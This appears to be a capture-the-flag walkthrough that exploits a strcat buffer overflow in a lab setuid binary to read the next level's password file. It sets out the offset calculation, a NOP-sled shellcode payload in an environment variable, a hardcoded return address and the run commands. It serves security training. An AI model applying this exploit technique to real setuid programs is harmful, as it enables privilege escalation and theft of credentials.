bonus2 - walkthrough
====================

Target: /home/user/bonus2/bonus2   (setuid + setgid bonus3)
Goal:   read /home/user/bonus3/.pass

1. The bug
   main() copies argv[1] (<=40) and argv[2] (<=32) into a 76-byte buffer, reads
   $LANG to pick a greeting language, then calls greetuser(buf). greetuser
   writes a fixed greeting into a 72-byte buffer and strcat's the user string
   onto it with no bound -> overflow.
     greeting[72] at ebp-0x48 -> saved return address is 76 bytes into greeting.
   The greeting length is chosen by $LANG:
     unset/other : "Hello "         (6 chars)
     LANG=fi     : "Hyvää päivää "  (18 chars)
     LANG=nl     : "Goedemiddag! "  (13 chars)

2. Offset -- pick the language so the address lands on the return address
   With LANG=nl the 13-char greeting means the combined input reaches the saved
   return address (greeting offset 76) at input offset 76 - 13 = 63, i.e.
   argv[1](40) + argv[2][23]. So the address goes at argv[2][23].

3. Shellcode in an env var (ASLR is off)
   The inputs are small, so put the shellcode behind a NOP sled in an env var
   and return into the sled (landing anywhere in the sled is fine).

4. Payload  (Ressources/exploit.py)
     shell_code = b"\x90"*500 + asm(shellcraft.i386.sh())   # -> file "scode"
     arg1 = b"A"*40
     arg2 = b"A"*23 + p32(0xbffffda0)                        # ret at argv[2][23]
   0xbffffda0 is a mid-sled address; it depends on the environment (EGG + LANG
   both present), so re-find it: gdb ./bonus2 -> run -> print/x getenv("EGG").

5. Run
     $ python3 Ressources/exploit.py
     $ export EGG="$(cat scode)"
     $ (sleep 1; echo 'cat /home/user/bonus3/.pass') | LANG=nl ./bonus2 "$(cat arg1)" "$(cat arg2)"
   greetuser returns into the sled, the shellcode spawns /bin/sh, and the piped
   command cats the flag.

